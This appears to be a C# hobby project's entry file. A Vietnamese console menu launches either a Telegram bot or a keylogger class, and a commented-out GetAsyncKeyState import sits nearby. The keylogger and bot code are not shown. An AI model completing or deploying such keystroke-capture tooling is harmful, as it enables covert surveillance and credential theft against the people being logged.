using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.InputFiles;
using xNet;

namespace BotTesst
{
    class Program
    {
       
        //public static string Translate(string input)
        //{
        //    string url = String.Format
        //    ("https://translate.googleapis.com/translate_a/single?client=gtx&sl={0}&tl={1}&dt=t&q={2}",
        //     "en", "vi", Uri.EscapeUriString(input));
        //    HttpClient httpClient = new HttpClient();
        //    string result = httpClient.GetStringAsync(url).Result;
        //    var jsonData = JsonConvert.DeserializeObject<dynamic>(result);

        //    var translationItems = jsonData[0];
        //    string translation = "";
        //    foreach (object item in translationItems)
        //    {
        //        IEnumerable translationLineObject = item as IEnumerable;
        //        IEnumerator translationLineString = translationLineObject.GetEnumerator();
        //        translationLineString.MoveNext();
        //        translation += string.Format(" {0}", Convert.ToString(translationLineString.Current));
        //    }
        //    if (translation.Length > 1) { translation = translation.Substring(1); };
        //    return translation;

        //}
        //[DllImport("user32.dll")]
        //public static extern int GetAsyncKeyState(Int32 i);
      
 
        static void Main(string[] args)
        {
            Console.WriteLine("Chon: ");
            int i = Int32.Parse(Console.ReadLine());
            switch (i)
            {
                case 1:
                    Console.WriteLine("Botchat tele");
                    Bottele bt = new Bottele();
                    bt.Bot();
                    break;
                case 2:
                    Console.WriteLine("Keyloger");
                    Keyloger keyloger = new Keyloger();
                    keyloger.HookKeyboard();
                    break;
                default:
                    Console.WriteLine("Khong hop le");
                    break;
                    
            }
            
           
            Console.ReadLine();
           
            }
    }
}
